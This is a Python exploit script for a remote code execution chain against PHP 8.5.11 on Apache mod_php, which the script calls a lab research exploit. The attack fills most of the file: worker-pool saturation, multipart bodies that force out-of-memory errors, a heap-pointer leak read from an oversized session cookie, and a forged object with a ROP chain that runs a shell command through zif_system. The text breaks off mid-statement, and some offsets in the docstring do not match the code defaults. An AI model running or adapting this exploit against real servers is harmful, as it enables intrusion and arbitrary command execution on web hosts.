#!/usr/bin/env python3
"""PHP2Shell RCE chain for PHP 8.5.11 apache/mod_php.

Usage: python3 exploit.py --host TARGET --rce 'id>/var/www/html/proof.txt'

Purpose and vulnerability mechanisms
====================================
This is a pure-HTTP, application-independent research exploit for an isolated
lab.  Its default endpoint is ``/index.php`` and is configurable with
``--path``.  With no ``--rce`` it stops after reproducing the overlong
``Set-Cookie`` disclosure.  With ``--rce [COMMAND]`` it composes two distinct
PHP memory-safety mechanisms.  Bare ``--rce`` runs the documented default and
verifies ``/proof.txt``; a custom command is delivered without claiming that
its execution was verified.

1. The A1/B1 disclosure is derived from 9bie's cross-request session-state
   chain.  An upload-progress request reaches an OOM bailout before request
   state is safely reset; a later request in the *same mod_php child* consumes
   the stale ``PS(id)`` and encodes an attacker-forged ``zend_string`` into the
   session cookie.  This is strongest-fit **CVE-2026-109619** behavior: request-
   owned session globals outlive their backing request heap.  OOM is the
   producer, but the security boundary crossed by this stage is request
   lifetime.

2. The optional final sink is adapted from Cookiengineer's OOM RCE.  Multipart
   amplification exhausts the stock 128 MiB heap while
   ``_zend_hash_str_add_or_update_i()`` has counted but not initialized its
   final ``HashTable`` bucket.  Same-request shutdown walks the incomplete
   bucket into a forged object, a libphp-only ``jump_fcontext`` ROP chain, and
   ``zif_system``.  This is the incomplete-state/cleanup mechanism of
   **CVE-2026-109618**.

Worker discovery, chunked transfer, prefork saturation, the full-pool scrub,
and the clean holder rebind are delivery/affinity techniques, not additional
CVEs.

Validated exact environment (2026-10-23)
========================================
This profile is intentionally build-specific.  Recalibrate all offsets and
heap geometry for any other binary, compiler flags, module set, architecture,
or loader layout.

* PHP 8.5.11 NTS, Zend Engine 4.5.11, source tag ``php-8.5.11``.
* Official ``php-8.5.11-apache`` image (the CTF target build); libphp with
  full symtab: ``zval_ptr_dtor=0x7b47a0``, ``zif_system=0x5996e0``,
  ``jump_fcontext+0x2e=0x64904e``, ``pop rdi; ret=0x197128``,
  ``pop rsi; ret=0x195a89``, ``ret=0x197129`` (all byte-verified).
* php.ini-production: memory_limit=128M, post_max_size=8M,
  upload_max_filesize=2M, max_file_uploads=20, max_input_vars=1000,
  max_input_nesting_level=64, session upload progress + cleanup enabled.
* 2026-11-02 measured on this build: the post-A1/B1 controlled block =
  leak_anchor + 0xA5B9E8 (the leak's top 2MiB pointer bucket as anchor;
  boot-stable across container restarts and B1 shapes).
* 402,500 duplicate multipart headers for the stock-128M sink (the failing
  allocation = 0x14000 inside zend_hash_str_update_ind, gdb-verified).

Direct lineage and credits
==========================
Credit belongs to the original researchers and repositories.

* **9bie**, ``php2shell-bypass-aslr-exp``: A1/B1 session-state OOM, forged
  cookie disclosure geometry, worker occupancy, the original ASLR-on chain.
* **Cookiengineer**, ``actual-php2shell``: the independently validated
  CVE-2026-109618 incomplete-bucket/object-destruction RCE sink.
* **dinosn**, ``php-cve-2026-10961x-lab-poc``: instrumented controls and
  calibration guidance.
"""

from __future__ import annotations

import argparse
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from pathlib import Path
import socket
import struct
import sys
import tempfile
import threading
import time
import urllib.parse


def print(*values: object, sep: str = " ", end: str = "\n",
          file: object | None = None, flush: bool = False) -> None:
    """Print every logical line with an epoch timestamp to microseconds."""
    stream = file if file is not None else sys.stdout
    payload = sep.join(str(value) for value in values) + end
    for line in payload.splitlines(keepends=True):
        now = time.time_ns()
        stamp = f"{now // 1_000_000_000}.{(now // 1_000) % 1_000_000:06d}"
        stream.write(f"[{stamp}] {line}")
    stream.flush()


DEFAULT_QUERY = (
    "?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
    "&z=vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv"
)
TARGET_PATH = "/index.php"
DEFAULT_RCE_COMMAND = "id>/var/www/html/proof.txt"
DEFAULT_RCE_PROOF_URL = "/proof.txt"
MULTIPART_BOUNDARY = b"C" * 10
RCE_BOUNDARY = b"AMP128BOUNDARY"
IS_OBJECT = 8


def build_a1_body(path: Path, args: argparse.Namespace) -> None:
    """Build the END-cleanup send-cookie OOM request body."""
    parts = 860
    depth = getattr(args, "a1_depth", 64)
    key_pad = getattr(args, "a1_keypad", 90)
    big_len = getattr(args, "a1_big_len", 8000)
    boundary = MULTIPART_BOUNDARY
    out = bytearray()

    def nested_name(index: int) -> bytes:
        return (("files[R%05d%s]" % (index, "K" * key_pad)).encode()
                + b"[a]" * (depth - 2))

    def part(name: bytes, value: bytes = b"", filename: bytes | None = None,
             content_type: bytes | None = None) -> None:
        out.extend(b"--" + boundary
                   + b"\r\nContent-Disposition: form-data; name=\""
                   + name + b"\"")
        if filename is not None:
            out.extend(b"; filename=\"" + filename + b"\"")
        out.extend(b"\r\n")
        if content_type is not None:
            out.extend(b"Content-Type: " + content_type + b"\r\n")
        out.extend(b"\r\n" + value + b"\r\n")

    part(b"PHPSESSID", b"\x00")
    # File-content pad: multipart FILE content streams to a temp file, so its
    # wire bytes carry ~zero retained Zend-MM mass.  Combined with one
    # shortened big value this shifts the parse/flush OOM boundary without
    # changing the part count, the tail order, or the registration set.
    filepad = getattr(args, "a1_filepad", 0)
    if filepad:
        part(b"fp", b"F" * filepad, filename=b"a.bin",
             content_type=b"application/octet-stream")
    # Count-overflow dummies: short names inserted at the front so the LAST
    # parts fall past max_input_vars (the else-branch callback still fires
    # for the progress field).  With --a1-churn these are the V9 live
    # state-producer combo.
    for index in range(getattr(args, "a1_dummies", 0)):
        part(("d%02d" % index).encode(), b"")
    for index in range(parts):
        if index == 0:
            content_type = b"C" * 103
        elif index == 1:
            content_type = b"C" * 231
        else:
            content_type = b"application/octet-stream"
        out.extend(b"--" + boundary
                   + b"\r\nContent-Disposition: form-data; name=\""
                   + nested_name(index) + b"\"")
        out.extend(b"; filename=\"A\"" if index < 2
                   else b"; filename=\"\"")
        out.extend(b"\r\nContent-Type: " + content_type + b"\r\n\r\n")
    churn = getattr(args, "a1_churn", False)
    for index in range(args.a1_fillers128):
        if churn:
            name = ("f%04d" % index).encode().ljust(31, b"x")[:31]
        else:
            name = ("f%04d" % index).encode().ljust(103, b"x")[:103]
        part(name, b"v" * 8)
    progress_done = False
    big_shrink = getattr(args, "a1_big_shrink", "")
    shrink_index = -1
    shrink_amount = 0
    if big_shrink:
        idx, _, amount = big_shrink.partition(":")
        shrink_index = int(idx)
        shrink_amount = int(amount)
    for index in range(args.a1_big):
        value = b"B" * (big_len - (shrink_amount if index == shrink_index
                                   else 0))
        if churn:
            name = ("b%04d" % index).encode() + b"x" * 30
        else:
            name = ("b%04d" % index).encode()
        part(name, value)
        if (not progress_done and args.a1_progress_position is not None
                and index == args.a1_progress_position):
            part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * args.a1_progress_len)
            progress_done = True
    for index in range(args.a1_burners):
        name = (("u%02d" % index).encode() + (b"x" * 31 if churn else b""))
        part(name, b"U" * args.a1_burner_len)
    if not progress_done:
        part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * args.a1_progress_len)
    out.extend(b"--" + boundary + b"--\r\n")
    path.write_bytes(out)
    count = (2 + parts + args.a1_fillers128 + args.a1_big
             + args.a1_burners)
    print(f"body={len(out)} parts={count}")


def leak_tag(index: int, tagged: bool) -> bytes:
    return (b"/" + ("%02d" % (index % 100)).encode() + b"BBBBB"
            if tagged else b"BBBB/BBB")


def leak_forge_fill_value(pages: int, page: int, fake_len: int,
                          index: int, tagged: bool) -> bytes:
    length = pages * 4096 - 25
    value = bytearray(b"A" * length)
    header = page * 0x1000 - 0x1018
    if 0 <= header and header + 0x20 <= length:
        struct.pack_into("<I", value, header, 0)
        struct.pack_into("<I", value, header + 4, 0x16)
        struct.pack_into("<Q", value, header + 8, 0)
        struct.pack_into("<Q", value, header + 0x10, fake_len)
        value[header + 0x18:header + 0x20] = leak_tag(index, tagged)
    return bytes(value)


def build_leak_body(path: Path, args: argparse.Namespace) -> None:
    """Build the B1 reclaim body and forged zend_string headers."""
    fake_len = args.fake_len
    out = bytearray()

    def part(name: bytes, value: bytes) -> None:
        out.extend(b"--" + MULTIPART_BOUNDARY
                   + b"\r\nContent-Disposition: form-data; name=\""
                   + name + b"\"\r\n\r\n" + value + b"\r\n")

    part(b"PHPSESSID", b"a")
    part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    index = 0
    pages_sequence = ([511, 511] + [args.small_pages] * 12
                      + [args.mid_pages, 511])
    for pages in pages_sequence:
        value = leak_forge_fill_value(
            pages, args.forge_page, fake_len, index, True)
        name = (b"f%04d" % index).ljust(120, b"f")[:120]
        part(name, value)
        index += 1
    for _ in range(args.nested_fields):
        name = ("x%05d" % index).encode() + b"[a]" * 12
        part(name, b"v")
        index += 1
    out.extend(b"--" + MULTIPART_BOUNDARY + b"--\r\n")
    path.write_bytes(out)
    print(f"body={len(out)} fields={index} fake_len={fake_len:#x}")


@dataclass
class Holder:
    """A worker-pinning request whose chunk stream can be finished in place."""

    sock: socket.socket
    feeding: bool = True
    lock: threading.Lock = field(default_factory=threading.Lock)

    def __getattr__(self, name: str) -> object:
        return getattr(self.sock, name)


def close_holder(holder: Holder) -> None:
    """Stop keepalive writes and close a holder without a sender race."""
    with holder.lock:
        holder.feeding = False
        try:
            holder.sock.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        holder.sock.close()


def open_accepted_holder(host: str, port: int,
                         timeout: float = 30.0) -> Holder:
    """Open one holder and wait for proof that a child accepted it."""
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.settimeout(timeout)
    sock.sendall(
        b"POST " + TARGET_PATH.encode() + b" HTTP/1.1\r\nHost: x\r\n"
        b"Content-Type: application/x-www-form-urlencoded\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"Connection: keep-alive\r\n"
        b"Expect: 100-continue\r\n\r\n"
    )
    interim = bytearray()
    try:
        while b"\r\n\r\n" not in interim and len(interim) < 8192:
            chunk = sock.recv(8192)
            if not chunk:
                break
            interim.extend(chunk)
        if b" 100 Continue\r\n" not in interim:
            raise RuntimeError(
                f"holder was not accepted by a worker: {bytes(interim[:120])!r}"
            )
        sock.sendall(b"1\r\nx\r\n")
        return Holder(sock)
    except BaseException:
        sock.close()
        raise


def hold_workers_parallel(host: str, port: int, workers: int,
                          holders: list[Holder]) -> list[Holder]:
    """Repin a known capacity without a VPN-latency retirement window."""
    opened: list[Holder] = []
    try:
        with ThreadPoolExecutor(max_workers=workers) as pool:
            futures = [
                pool.submit(open_accepted_holder, host, port, 30.0)
                for _ in range(workers)
            ]
            for future in as_completed(futures):
                opened.append(future.result())
                count = len(opened)
                if count % 25 == 0 or count == workers:
                    print(f"[*] accepted holders {count}/{workers} parallel",
                          flush=True)
    except BaseException:
        for holder in opened:
            close_holder(holder)
        raise
    holders.extend(opened)
    return opened


def discover_worker_pool(host: str, port: int,
                         holders: list[Holder], max_workers: int,
                         timeout: float, checks: int) -> int:
    """Fill prefork dynamically until repeated holders remain unaccepted."""
    misses = 0
    while len(holders) < max_workers:
        try:
            holders.append(open_accepted_holder(host, port, timeout))
        except TimeoutError:
            misses += 1
            print(f"[*] capacity probe {misses}/{checks} timed out at "
                  f"{len(holders)} accepted holders", flush=True)
            if misses >= checks:
                break
            time.sleep(1.0)
            continue
        misses = 0
        if len(holders) % 25 == 0:
            print(f"[*] accepted holders {len(holders)} (auto)", flush=True)
    if not holders or misses < checks:
        raise RuntimeError(
            f"worker discovery did not find a ceiling below {max_workers}"
        )
    print(f"[+] discovered MaxRequestWorkers={len(holders)}", flush=True)
    return len(holders)


def keep_holders_alive(holders: list[Holder],
                       stop: threading.Event) -> None:
    """Beat mod_reqtimeout's body minimum-rate check without completing POSTs."""
    block = b"400\r\n" + b"x" * 1024 + b"\r\n"
    while not stop.wait(1.0):
        for holder in tuple(holders):
            try:
                with holder.lock:
                    if holder.feeding:
                        holder.sock.sendall(block)
            except OSError:
                pass


def read_content_length_response(sock: socket.socket, timeout: float) -> bytes:
    """Read one keep-alive HTTP response with an explicit Content-Length."""
    sock.settimeout(timeout)
    response = bytearray()
    while b"\r\n\r\n" not in response:
        chunk = sock.recv(65536)
        if not chunk:
            raise ConnectionError("worker closed before response headers")
        response.extend(chunk)
        if len(response) > 65536:
            raise RuntimeError("oversized qualification response headers")
    head, body = bytes(response).split(b"\r\n\r\n", 1)
    content_length = None
    for line in head.split(b"\r\n")[1:]:
        name, sep, value = line.partition(b":")
        if sep and name.lower() == b"content-length":
            content_length = int(value.strip())
            break
    if content_length is None:
        raise RuntimeError("qualification response lacks Content-Length")
    while len(body) < content_length:
        chunk = sock.recv(min(65536, content_length - len(body)))
        if not chunk:
            raise ConnectionError("worker closed during response body")
        body += chunk
    if len(body) != content_length:
        raise RuntimeError("qualification response over-read pipelined bytes")
    return head + b"\r\n\r\n" + body


def cleanly_release_holder(holder: Holder, host: str, port: int,
                           path: str, timeout: float) -> None:
    """End a holder without Apache's two-second lingering-close path."""
    with holder.lock:
        holder.feeding = False
        holder.sock.sendall(b"0\r\n\r\n")
    first = read_content_length_response(holder.sock, timeout)
    if not first.startswith(b"HTTP/1.1 200"):
        raise RuntimeError(f"holder completion failed: {first[:80]!r}")
    holder.sock.sendall(
        b"POST " + path.encode() + b" HTTP/1.1\r\nHost: "
        + host.encode() + b":" + str(port).encode()
        + b"\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
    )
    second = read_content_length_response(holder.sock, timeout)
    if not second.startswith(b"HTTP/1.1 200"):
        raise RuntimeError(f"worker close probe failed: {second[:80]!r}")
    holder.sock.settimeout(timeout)
    while holder.sock.recv(4096):
        pass
    holder.sock.close()


def scrub_worker_pool(holders: list[Holder], host: str, port: int,
                      path: str, timeout: float) -> None:
    """Force every pinned prefork child through request completion."""
    batch = list(holders)
    holders.clear()

    def release(holder: Holder) -> str | None:
        try:
            cleanly_release_holder(holder, host, port, path, timeout)
            return None
        except (OSError, RuntimeError) as exc:
            close_holder(holder)
            return str(exc)

    errors: list[str] = []
    with ThreadPoolExecutor(max_workers=len(batch)) as pool:
        futures = [pool.submit(release, holder) for holder in batch]
        for future in as_completed(futures):
            error = future.result()
            if error:
                errors.append(error)
    print(f"[*] scrubbed {len(batch)} workers; early_closes={len(errors)}",
          flush=True)


@dataclass
class ChunkedJob:
    thread: threading.Thread
    errors: list[BaseException]


def start_chunked(host: str, port: int, path: str, body: Path,
                  response: Path, timeout: float,
                  stall_bytes: int = 0,
                  stall_seconds: float = 0.0) -> ChunkedJob:
    """Start a streaming chunked request without an external helper."""
    errors: list[BaseException] = []

    def send() -> None:
        body_size = body.stat().st_size
        started = time.monotonic()
        received = bytearray()
        sock: socket.socket | None = None
        try:
            sock = socket.create_connection((host, port), timeout=timeout)
            sock.settimeout(timeout)
            sock.sendall(
                b"POST " + path.encode() + b" HTTP/1.1\r\nHost: "
                + host.encode() + b":" + str(port).encode()
                + b"\r\nContent-Type: multipart/form-data; boundary="
                + MULTIPART_BOUNDARY
                + b"\r\nTransfer-Encoding: chunked\r\n"
                  b"Connection: close\r\n\r\n"
            )
            sent_total = 0
            stalled = False
            with body.open("rb") as stream:
                while True:
                    piece = stream.read(65536)
                    if not piece:
                        break
                    sock.sendall(f"{len(piece):x}\r\n".encode()
                                 + piece + b"\r\n")
                    sent_total += len(piece)
                    if (not stalled and stall_seconds > 0.0
                            and sent_total >= stall_bytes):
                        stalled = True
                        print(f"[stall] sent={sent_total} sleeping "
                              f"{stall_seconds}s", flush=True)
                        time.sleep(stall_seconds)
            sock.sendall(b"0\r\n\r\n")
            while len(received) < 4 << 20:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                received.extend(chunk)
        except OSError as exc:
            if sock is None:
                errors.append(exc)
        finally:
            if sock is not None:
                sock.close()
            response.write_bytes(received)
            status = bytes(received).split(b"\r\n", 1)[0][:60]
            print(f"body={body_size} resp={len(received)} "
                  f"elapsed={time.monotonic() - started:.2f}s "
                  f"status={status.decode('latin1', 'replace')!r}")

    thread = threading.Thread(target=send, name="chunked-request", daemon=True)
    thread.start()
    return ChunkedJob(thread, errors)


def finish_chunked(job: ChunkedJob, response: Path, timeout: float) -> bytes:
    job.thread.join(timeout)
    if job.thread.is_alive():
        raise TimeoutError("chunked request did not finish")
    if job.errors:
        raise job.errors[0]
    return response.read_bytes()


def cookie_value(response: bytes) -> bytes:
    marker = b"Set-Cookie: PHPSESSID="
    start = response.find(marker)
    if start < 0:
        return b""
    return response[start + len(marker):].split(b"\r\n", 1)[0]


def summarize_cookie(encoded: bytes, pointer_floor: int) -> dict[str, object]:
    decoded = urllib.parse.unquote_to_bytes(encoded.decode("latin1"))
    pointers = Counter()
    for off in range(0, len(decoded) - 7, 8):
        value = struct.unpack_from("<Q", decoded, off)[0]
        if pointer_floor <= value <= 0x7FFFFFFFFFFF:
            pointers[value] += 1
    return {
        "decoded": decoded,
        "pointers": pointers,
        "top": pointers.most_common(20),
    }


def pack_u64(value: int) -> bytes:
    return struct.pack("<Q", value)


def pack_u32(value: int) -> bytes:
    return struct.pack("<I", value)


def build_rce_pad(heap_base: int, libphp_base: int, command: bytes, *,
                  block_offset: int, pivot_offset: int,
                  pop_rdi_offset: int, pop_rsi_offset: int,
                  ret_offset: int, zif_system_offset: int) -> bytes:
    """Build the forged bucket, object, handlers, ROP, and execute_data."""
    if len(command) > 48:
        raise ValueError("RCE command exceeds the 48-byte carrier")
    block = heap_base + block_offset
    handlers = block + 24 + 2000
    obj = block + 24 + 2048
    execute_data = block + 24 + 2240
    command_string = execute_data + 0x80
    return_value = block + 24 + 2464

    pivot = libphp_base + pivot_offset
    pop_rdi = libphp_base + pop_rdi_offset
    pop_rsi = libphp_base + pop_rsi_offset
    ret = libphp_base + ret_offset
    zif_system = libphp_base + zif_system_offset

    pad = bytearray(b"P" * 2528)
    pad[2000:2008] = pack_u64(0)
    pad[2008:2016] = pack_u64(pivot)
    pad[2016:2024] = pack_u64(ret)

    offset = 2048
    pad[offset:offset + 4] = pack_u32(1)
    pad[offset + 4:offset + 8] = pack_u32(IS_OBJECT)
    pad[offset + 8:offset + 12] = pack_u32(0)
    pad[offset + 0x10:offset + 0x18] = pack_u64(0)
    pad[offset + 0x18:offset + 0x20] = pack_u64(handlers)
    pad[offset + 0x20:offset + 0x28] = pack_u64(0)
    pad[offset + 0x28:offset + 0x40] = b"\x00" * 24
    pad[offset + 0x40:offset + 0x48] = pack_u64(pop_rdi)
    pad[offset + 0x48:offset + 0x50] = pack_u64(execute_data)
    pad[offset + 0x50:offset + 0x58] = pack_u64(pop_rsi)
    pad[offset + 0x58:offset + 0x60] = pack_u64(return_value)
    # SysV: zif_system must enter with rsp % 16 == 8.  The chain enters at
    # obj+0x68 (rsp=obj+0x68) when zif_system sits directly at +0x60, or at
    # rsp=obj+0x70 through the extra `ret`.  Choose per the block's parity.
    if (obj + 0x68) & 0xF == 8:
        pad[offset + 0x60:offset + 0x68] = pack_u64(zif_system)
        pad[offset + 0x68:offset + 0x70] = pack_u64(0)
    else:
        pad[offset + 0x60:offset + 0x68] = pack_u64(ret)
        pad[offset + 0x68:offset + 0x70] = pack_u64(zif_system)
    pad[offset + 0x70:offset + 0x78] = pack_u64(0)

    offset = 2240
    pad[offset:offset + 8] = pack_u64(0)
    pad[offset + 8:offset + 0x10] = pack_u64(0)
    pad[offset + 0x10:offset + 0x18] = pack_u64(return_value)
    pad[offset + 0x18:offset + 0x20] = pack_u64(0)
    pad[offset + 0x20:offset + 0x28] = pack_u64(0)
    pad[offset + 0x28:offset + 0x2C] = pack_u32(0)
    pad[offset + 0x2C:offset + 0x30] = pack_u32(1)
    pad[offset + 0x30:offset + 0x38] = pack_u64(0)
    pad[offset + 0x38:offset + 0x40] = pack_u64(0)
    pad[offset + 0x40:offset + 0x44] = pack_u32(0)
    pad[offset + 0x50:offset + 0x58] = pack_u64(command_string)
    pad[offset + 0x58:offset + 0x5C] = pack_u32(6)

    offset += 0x80
    pad[offset:offset + 4] = pack_u32(1)
    pad[offset + 4:offset + 8] = pack_u32(0x106)
    pad[offset + 8:offset + 0x10] = pack_u64(0)
    pad[offset + 0x10:offset + 0x18] = pack_u64(len(command) - 1)
    pad[offset + 0x18:offset + 0x18 + len(command)] = command
    pad[2464:2480] = b"\x00" * 16

    pad[1928:1936] = pack_u64(obj)
    pad[1936:1940] = pack_u32(IS_OBJECT | 0x100)
    pad[1940:1944] = pack_u32(0)
    return bytes(pad)


def rce_field(name: bytes, value: bytes) -> bytes:
    return (b"--" + RCE_BOUNDARY
            + b"\r\nContent-Disposition: form-data; name=\"" + name
            + b"\"\r\n\r\n" + value + b"\r\n")


def rce_large_key(index: int, size: int) -> bytes:
    return b"X" * (size - 16) + (b"%016d" % index)


def build_rce_body(args: argparse.Namespace, heap_base: int,
                   libphp_base: int, command: str) -> bytes:
    pad = build_rce_pad(
        heap_base, libphp_base, command.encode() + b"\x00",
        block_offset=args.rce_block_offset,
        pivot_offset=args.pivot_offset,
        pop_rdi_offset=args.pop_rdi_offset,
        pop_rsi_offset=args.pop_rsi_offset,
        ret_offset=args.ret_offset,
        zif_system_offset=args.zif_system_offset,
    )
    key_size = 80000
    body = bytearray()
    body += rce_field(b"memshift", b"M" * 40000)
    for index in range(30):
        body += rce_field(
            b"a[" + rce_large_key(index, key_size) + b"][c]", b"v")
    body += rce_field(b"pad", pad)
    body += rce_field(b"pad", b"x")
    for index in range(30, 45):
        body += rce_field(
            b"a[" + rce_large_key(index, key_size) + b"][c]", b"v")
    final_name = b"a[" + rce_large_key(45, key_size) + b"][c]"
    body += b"--" + RCE_BOUNDARY + b"\r\n"
    body += b"X: a\r\n" * args.rce_headers
    body += (b"Content-Disposition: form-data; name=\"" + final_name
             + b"\"\r\n\r\nv\r\n--" + RCE_BOUNDARY + b"--\r\n")
    if len(body) >= 8 * 1024 * 1024:
        raise ValueError(f"RCE body exceeds production post_max_size: {len(body)}")
    return bytes(body)


def http_exchange(host: str, port: int, request: bytes,
                  timeout: float) -> bytes:
    response = bytearray()
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
    except OSError:
        return b""
    sock.settimeout(timeout)
    try:
        sock.sendall(request)
        while True:
            data = sock.recv(65536)
            if not data:
                break
            response.extend(data)
    except OSError:
        pass
    finally:
        sock.close()
    return bytes(response)


def amplified_rce(args: argparse.Namespace, heap_base: int,
                  libphp_base: int, command: str,
                  proof_url: str | None) -> bool | None:
    body = build_rce_body(args, heap_base, libphp_base, command)
    print(f"[*] wire={len(body)} headers={args.rce_headers}")
    request = (
        b"POST " + args.path.encode() + b" HTTP/1.1\r\nHost: v\r\n"
        b"Content-Type: multipart/form-data; boundary=" + RCE_BOUNDARY
        + b"\r\nContent-Length: " + str(len(body)).encode()
        + b"\r\nConnection: close\r\n\r\n" + body
    )
    response = http_exchange(args.host, args.port, request, 30.0)
    first = response.split(b"\r\n", 1)[0] if response else b"<no response>"
    print(f"[*] response={len(response)} first={first!r}")
    if proof_url is None:
        return None
    content = b""
    for attempt in range(3):
        time.sleep(1.0 if attempt else 0.5)
        proof = http_exchange(
            args.host, args.port,
            b"POST " + proof_url.encode()
            + b" HTTP/1.1\r\nHost: v\r\nContent-Length: 0"
            b"\r\nConnection: close\r\n\r\n",
            15.0,
        )
        head, _, body_part = proof.partition(b"\r\n\r\n")
        for line in head.split(b"\r\n"):
            if b"X-Attempt-ID" in line or line.startswith(b"HTTP/"):
                print(f"[*] proof-fetch: {line.decode('latin-1')}")
        if body_part.strip():
            content = body_part
            break
    if content.strip():
        print("[+] 128M amplified RCE:",
              content.decode("utf-8", "replace").strip()[:2000])
        return True
    print("[-] no proof")
    return False


def main() -> int:
    global TARGET_PATH
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--path", default=TARGET_PATH,
                    help="PHP endpoint used for pinning and exploitation")
    ap.add_argument("--pause-before-rce", type=float, default=0.0,
                    help="debug-only pause after disclosure and before RCE")
    ap.add_argument("--timeout", type=float, default=600.0)
    ap.add_argument("--pause-after-rebind", type=float, default=0.0,
                    help="debug-only GDB attach pause on the rebound holder")
    ap.add_argument("--a1-big", type=int, default=78)
    ap.add_argument("--a1-fillers128", type=int, default=14)
    ap.add_argument("--a1-burners", type=int, default=19)
    ap.add_argument("--a1-burner-len", type=int, default=4000)
    ap.add_argument("--a1-progress-len", type=int, default=4072)
    ap.add_argument("--a1-progress-position", type=int, default=None,
                    help="insert the progress part after this big-field "
                         "index (retunes the sid-chunk cache depth)")
    ap.add_argument("--a1-keypad", type=int, default=90)
    ap.add_argument("--a1-dummies", type=int, default=0)
    ap.add_argument("--a1-churn", action="store_true",
                    help="64B-class churn names (the V9 live combo with "
                         "dummies)")
    ap.add_argument("--a1-filepad", type=int, default=0)
    ap.add_argument("--a1-big-shrink", default="",
                    help="index:bytes - shorten one big's value")
    ap.add_argument("--query", default=DEFAULT_QUERY)
    ap.add_argument("--forge-page", type=lambda x: int(x, 0), default=0x1E3,
                    help="page containing the stale session ID")
    ap.add_argument("--mid-pages", type=int, default=483,
                    help="pages in the hole-making G value (default: 483)")
    ap.add_argument("--small-pages", type=int, default=511,
                    help="pages in the 14 non-forge fills")
    ap.add_argument("--nested-fields", type=int, default=900,
                    help="nested X fields placed into the tail hole")
    ap.add_argument("--fake-len", type=lambda x: int(x, 0), default=0x1C000)
    ap.add_argument("--pointer-floor", type=lambda x: int(x, 0),
                    default=0x6F0000000000)
    ap.add_argument("--zval-ptr-dtor-offset", type=lambda x: int(x, 0),
                    default=0x7AE960)
    ap.add_argument(
        "--rce", nargs="?", const=DEFAULT_RCE_COMMAND, metavar="COMMAND",
        help=("feed the leak into the stock-128M libphp-only sink; default "
              f"command: {DEFAULT_RCE_COMMAND!r}; custom commands are "
              "delivered without execution verification"))
    ap.add_argument("--heap-from-lib-delta", type=lambda x: int(x, 0),
                    default=0x3400000,
                    help="exact-image Zend main-chunk delta from libphp")
    ap.add_argument("--rce-block-offset", type=lambda x: int(x, 0),
                    default=0x5C400,
                    help="controlled block offset after A1/B1 history")
    ap.add_argument("--rce-headers", type=int, default=402500)
    ap.add_argument("--pivot-offset", type=lambda x: int(x, 0),
                    default=0x6362AE)
    ap.add_argument("--pop-rdi-offset", type=lambda x: int(x, 0),
                    default=0x280D8D)
    ap.add_argument("--pop-rsi-offset", type=lambda x: int(x, 0),
                    default=0x2CBE07)
    ap.add_argument("--ret-offset", type=lambda x: int(x, 0),
                    default=0x280D8E)
    ap.add_argument("--zif-system-offset", type=lambda x: int(x, 0),
                    default=0x598650)
    args = ap.parse_args()
    if not args.path.startswith("/"):
        args.path = "/" + args.path
    TARGET_PATH = args.path

    holders: list[Holder] = []
    holder_stop = threading.Event()
    holder_thread = threading.Thread(
        target=keep_holders_alive, args=(holders, holder_stop), daemon=True)
    holder_thread.start()
    try:
        effective_workers = discover_worker_pool(
            args.host, args.port, holders, 512, 5.0, 2)
        scrub_worker_pool(holders, args.host, args.port, args.path, 30.0)
        hold_workers_parallel(args.host, args.port, effective_workers, holders)
        print(f"[+] repinned scrubbed pool={effective_workers}", flush=True)
        queued_release_index = len(holders) - 1
        print(f"[*] pinned {len(holders)}/{effective_workers} workers")

        with tempfile.TemporaryDirectory(prefix="ninebie-8511-") as tmp_s:
            tmp = Path(tmp_s)
            a1 = tmp / "a1.bin"
            build_a1_body(a1, args)
            a1_response = tmp / "a1.resp"
            b1 = tmp / "b1.bin"
            build_leak_body(b1, args)
            b1_response = tmp / "b1.resp"

            old_holder = holders.pop(queued_release_index)
            rebound = None
            for rebind_attempt in range(1, 3):
                old_port = old_holder.getsockname()[1]
                try:
                    cleanly_release_holder(
                        old_holder, args.host, args.port, args.path, 15.0)
                except (OSError, RuntimeError) as exc:
                    close_holder(old_holder)
                    print(f"[*] clean rebind probe closed early: {exc}")
                started = time.monotonic()
                rebound = open_accepted_holder(args.host, args.port, 30.0)
                print(f"[*] rebind attempt={rebind_attempt} old_port={old_port} "
                      f"new_port={rebound.getsockname()[1]} "
                      f"elapsed={time.monotonic() - started:.3f}s")
                if rebind_attempt == 1:
                    old_holder = rebound
            assert rebound is not None
            holders.append(rebound)
            queued_release_index = len(holders) - 1
            if args.pause_after_rebind:
                print(f"[*] pausing {args.pause_after_rebind:g}s after rebind")
                time.sleep(args.pause_after_rebind)

            a1_process = start_chunked(
                args.host, args.port, args.path + args.query, a1,
                a1_response, 900.0)
            print('SLEEPING-60-FOR-ATTACH', flush=True); time.sleep(60.0)
            b1_process = start_chunked(
                args.host, args.port, args.path, b1, b1_response,
                args.timeout)
            time.sleep(0.05)
            released = holders.pop(queued_release_index)
            local_port = released.getsockname()[1]
            close_holder(released)
            print(f"[*] released rebound holder client_port={local_port} "
                  "into queued A1/B1")
            finish_chunked(a1_process, a1_response, 200.0)
            print(f"[*] A1 response={a1_response.stat().st_size}")
            response = finish_chunked(b1_process, b1_response,
                                      args.timeout + 30.0)

            encoded = cookie_value(response)
            print(f"[*] B1 response={len(response)} encoded_cookie={len(encoded)}")
            if not encoded:
                print("[-] no Set-Cookie PHPSESSID value")
                return 1
            result = summarize_cookie(encoded, args.pointer_floor)
            decoded = result["decoded"]
            pointers = result["pointers"]
            print(f"[*] decoded_cookie={len(decoded)} candidates={len(pointers)}")
            for value, count in result["top"]:
                print(f"    {value:#014x} count={count}")
            if len(decoded) <= 256:
                print(f"[-] normal-size cookie: {decoded!r}")
                return 2
            if pointers:
                dominant, count = pointers.most_common(1)[0]
                buckets = Counter()
                for value, value_count in pointers.items():
                    buckets[value & ~0x1FFFFF] += value_count
                print(f"[+] dominant={dominant:#x} count={count} "
                      f"libphp_candidate={libphp:#x}" if False else
